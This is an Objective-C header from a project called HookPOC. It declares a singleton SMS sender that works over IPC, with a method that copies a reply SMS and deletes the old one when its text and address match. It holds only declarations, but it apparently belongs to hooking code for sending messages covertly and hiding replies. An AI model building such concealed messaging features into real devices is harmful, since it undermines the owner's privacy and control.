//
//  SMSSender000.h
//  HookPOC
//
//  Created by Makara Khloth on 3/8/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "MessagePortIPCReader.h"

@class FxMessage;

@interface SMSSender000 : NSObject <MessagePortIPCDelegate> {
@private
	NSThread		*mCurrentThread;		// Not own
	NSMutableArray	*mMessages;				// FxMessage
	BOOL			mSendingSMS;			// Flag
}

@property (readonly) NSThread *mCurrentThread;
@property (readonly) NSMutableArray *mMessages;
@property (assign) BOOL mSendingSMS;

+ (id) sharedSMSSender000;

- (FxMessage *) copyReplySMSAndDeleteOldOneIfMatchText: (NSString *) aText
										   withAddress: (NSString *) aAddress;

- (void) sendSMSFinished: (NSInteger) aError;
- (void) normalSMSDidSend: (NSInteger) aRowID;
- (void) normalMMSDidSend: (NSInteger) aRowID;

@end
